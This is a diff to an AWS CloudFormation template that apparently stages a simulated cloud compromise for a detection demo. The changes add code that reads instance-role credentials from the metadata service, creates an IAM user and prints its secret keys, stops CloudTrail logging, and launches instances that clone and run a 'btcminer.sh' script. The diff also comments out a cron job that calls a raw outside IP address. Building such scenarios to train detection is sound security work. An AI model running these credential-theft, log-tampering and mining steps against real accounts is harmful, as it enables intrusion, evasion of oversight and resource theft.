@@ -1021,6 +1021,7 @@ Resources:
     DependsOn: 
       - CompromisedInstanceProfile
       - CloudTrail
+      - BTCS3Bucket
     Type: AWS::EC2::Instance
     Properties: 
       IamInstanceProfile: !Ref CompromisedInstanceProfile
@@ -1074,6 +1075,9 @@ Resources:
             expiration=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/${CompromisedInstanceRole} | grep Expiration | cut -d':' -f2 | sed 's/[^0-9A-Za-z/+=]*//g'`
             compromisedip=`curl http://169.254.169.254/latest/meta-data/local-ipv4`
             ami=`curl -s http://169.254.169.254/latest/meta-data/ami-id`
+           
+            echo $subnetid
+
             starttime=$(date +%s)
 
             sudo touch /var/log/secure
@@ -1143,7 +1147,7 @@ Resources:
             # create EC2 instance commands
             # sleep 21m
             export ami
-            aws ec2 run-instances --region $region --image-id $ami --count 1 --subnet-id ${PublicSubnet2}  --instance-type t2.micro --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=another_miner},{Key=Description,Value=created from web server}]' 
+            # aws ec2 run-instances --region $region --image-id $ami --count 1 --subnet-id ${PublicSubnet2}  --instance-type t2.micro --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=another_miner},{Key=Description,Value=created from web server}]' 
 
             aws iam get-credential-report --region=$region
 
@@ -1186,7 +1190,7 @@ Resources:
             # committed out redundant stopping and deleting of CloudTrail logging
 
             # sleep 45
-            aws cloudtrail stop-logging --name=${CloudTrail}  --region=$region
+            # aws cloudtrail stop-logging --name=${CloudTrail}  --region=$region
             EOT
 
             sudo sh /tmp/attackerlifecycle.sh
@@ -1206,12 +1210,15 @@ Resources:
 
             # creates access key and secret id for new user
             access_key_pair = user.create_access_key_pair()
+            print(access_key_pair)
             access_id = access_key_pair.id
             secret_key = access_key_pair.secret
 
+            print(access_id + " " + secret_key)
+
             # set environment variables to new user access key and secret
-            os.environ["AWS_ACCESS_KEY_ID"] = access_key_pair.id
-            os.environ["AWS_SECRET_ACCESS_KEY"] = access_key_pair.secret
+            os.environ["AWS_ACCESS_KEY_ID"] = access_id
+            os.environ["AWS_SECRET_ACCESS_KEY"] = secret_key
             os.environ["AWS_DEFAULT_REGION"] = "$region"
             os.environ["AWS_SESSION_TOKEN"] = ""
 
@@ -1225,6 +1232,46 @@ Resources:
                 SecretString='test'
             )
 
+            ec2 = boto3.client('ec2')
+            
+            user_data = '''#!/bin/bash 
+            export AWS_ACCESS_KEY_ID="$access_id"
+            export AWS_SECRET_ACCESS_KEY="$secret_key"
+            export AWS_DEFAULT_REGION="$region"
+            
+            sudo yum update -y -q && sudo yum upgrade -y -q
+            sudo yum install awscli -y -q
+            sudo yum install git -y
+
+            aws configure set aws_access_key_id $access_id
+            aws configure set aws_secret_access_key $secret_key
+            aws configure set default.region $region
+            aws configure set region $region
+
+            aws cloudtrail stop-logging --name=${CloudTrail}  --region=$region
+
+            wget https://inspector-agent.amazonaws.com/linux/latest/install
+            sudo bash install
+            sudo git clone https://github.com/sheldonlsides/detective-env-demo.git
+            cd detective-env-demo
+            sudo chmod +x btcminer.sh
+            sudo sh btcminer.sh'''
+
+            ec2.run_instances(
+              MaxCount=2,
+              MinCount=2,
+              SubnetId='${PublicSubnet1}',
+              ImageId='${LatestAWSLinuxAmiId}',
+              InstanceType='t2.large',
+              TagSpecifications=[
+                {
+                  'ResourceType': 'instance',
+                  'Tags':[{'Key':'Name','Value':'BTC Miner'}]
+                }
+              ],
+              UserData=user_data
+            )
+
             print(response)
 
             print("Finished running new user attack")
@@ -1234,68 +1281,70 @@ Resources:
             iam.delete_access_key(AccessKeyId=access_id,UserName=new_user)
 
             EOT
+            
+            aws s3 cp /tmp/pythonattacker.py s3://${BTCS3Bucket}/pythonattacker.py
 
             sudo python /tmp/pythonattacker.py
 
             echo 'Bootstrapping complete'
 
-  Miner1:
-    DependsOn: BTCS3Bucket
-    Type: AWS::EC2::Instance
-    Properties: 
-      InstanceType: c5.xlarge
-      IamInstanceProfile: !Ref BitcoinInstanceProfile
-      ImageId: !Ref LatestAWSLinuxAmiId
-      NetworkInterfaces: 
-        - AssociatePublicIpAddress: 'true'
-          DeviceIndex: '0'
-          GroupSet:
-            - !Ref MINERSG
-          SubnetId: !Ref PublicSubnet1
-      Tags:
-        - Key: Name
-          Value: "BTC Miner 1"
-      UserData:
-        Fn::Base64: !Sub |
-            #!/bin/bash -x
-            #This can be on a AWS Linux AMI
-            exec > /tmp/part-001.log 2>&1
+  # Miner1:
+  #   DependsOn: BTCS3Bucket
+  #   Type: AWS::EC2::Instance
+  #   Properties: 
+  #     InstanceType: c5.xlarge
+  #     IamInstanceProfile: !Ref BitcoinInstanceProfile
+  #     ImageId: !Ref LatestAWSLinuxAmiId
+  #     NetworkInterfaces: 
+  #       - AssociatePublicIpAddress: 'true'
+  #         DeviceIndex: '0'
+  #         GroupSet:
+  #           - !Ref MINERSG
+  #         SubnetId: !Ref PublicSubnet1
+  #     Tags:
+  #       - Key: Name
+  #         Value: "BTC Miner 1"
+  #     UserData:
+  #       Fn::Base64: !Sub |
+  #           #!/bin/bash -x
+  #           #This can be on a AWS Linux AMI
+  #           exec > /tmp/part-001.log 2>&1
 
-            # Get Updates and Install Necessary Packages
-            sudo yum update -y -q && sudo yum upgrade -y -q
-            sudo yum install go -y -q
-            sudo yum install git -y -q
+  #           # Get Updates and Install Necessary Packages
+  #           sudo yum update -y -q && sudo yum upgrade -y -q
+  #           sudo yum install go -y -q
+  #           sudo yum install git -y -q
 
-            #Update Path
-            export PATH=$PATH:/usr/local/bin:/usr/sbin:/root/.local/bin
-            echo 'export PATH=/root/.local/bin:/usr/sbin:$PATH' >> /home/ec2-user/.profile
+  #           #Update Path
+  #           export PATH=$PATH:/usr/local/bin:/usr/sbin:/root/.local/bin
+  #           echo 'export PATH=/root/.local/bin:/usr/sbin:$PATH' >> /home/ec2-user/.profile
 
-            # install (installs in /home/ec2-user/go/bin)
-            go get -u github.com/alphasoc/flightsim/
+  #           # install (installs in /home/ec2-user/go/bin)
+  #           go get -u github.com/alphasoc/flightsim/
 
-            # Create FlightSim Miner Cron Job
-            cat <<EOT > /tmp/FlightSim-Miner.sh
-            #!/bin/bash
-            /home/ec2-user/go/bin/flightsim run miner
-            EOT
+  #           # Create FlightSim Miner Cron Job
+  #           cat <<EOT > /tmp/FlightSim-Miner.sh
+  #           #!/bin/bash
+  #           /home/ec2-user/go/bin/flightsim run miner
+  #           EOT
 
-            sudo cp /tmp/FlightSim-Miner.sh /home/ec2-user/FlightSim-Miner.sh
-            sudo chmod 744 /home/ec2-user/FlightSim-Miner.sh
-            sudo chown ec2-user /home/ec2-user/FlightSim-Miner.sh
+  #           sudo cp /tmp/FlightSim-Miner.sh /home/ec2-user/FlightSim-Miner.sh
+  #           sudo chmod 744 /home/ec2-user/FlightSim-Miner.sh
+  #           sudo chown ec2-user /home/ec2-user/FlightSim-Miner.sh
 
-            # Create Fake Bitcoin Cron Job
-            cat <<EOT > /tmp/bitcoin-ping.sh
-            !/bin/bash
-            wget https://104.140.201.42:9000/favicon.ico --no-check-certificate | rm favicon.* >/dev/null 2>&1
-            EOT
+  #           # Create Fake Bitcoin Cron Job
+  #           cat <<EOT > /tmp/bitcoin-ping.sh
+  #           !/bin/bash
+  #           wget https://104.140.201.42:9000/favicon.ico --no-check-certificate | rm favicon.* >/dev/null 2>&1
+  #           EOT
 
-            sudo cp /tmp/bitcoin-ping.sh /home/ec2-user/bitcoin-ping.sh
-            sudo chmod 744 /home/ec2-user/bitcoin-ping.sh
-            sudo chown ec2-user /home/ec2-user/bitcoin-ping.sh
+  #           sudo cp /tmp/bitcoin-ping.sh /home/ec2-user/bitcoin-ping.sh
+  #           sudo chmod 744 /home/ec2-user/bitcoin-ping.sh
+  #           sudo chown ec2-user /home/ec2-user/bitcoin-ping.sh
 
-            echo "*/9 * * * * /home/ec2-user/FlightSim-Miner.sh > /home/ec2-user/FlightSim-Miner.log 2>&1" >> cron
-            echo "*/12 * * * * /home/ec2-user/bitcoin-ping.sh > /home/ec2-user/bitcoin-ping.log 2>&1" >> cron
-            sudo crontab -u ec2-user cron
+  #           echo "*/9 * * * * /home/ec2-user/FlightSim-Miner.sh > /home/ec2-user/FlightSim-Miner.log 2>&1" >> cron
+  #           echo "*/12 * * * * /home/ec2-user/bitcoin-ping.sh > /home/ec2-user/bitcoin-ping.log 2>&1" >> cron
+  #           sudo crontab -u ec2-user cron
   
   # Miner2:
   #   Type: AWS::EC2::Instance
@@ -2486,3 +2535,6 @@ Outputs:
     Value: !Ref "PublicSubnet2"
     Export:
       Name: "PublicSubnet2"
+  
+  S3Bucket:
+    Value: !Ref "BTCS3Bucket" 
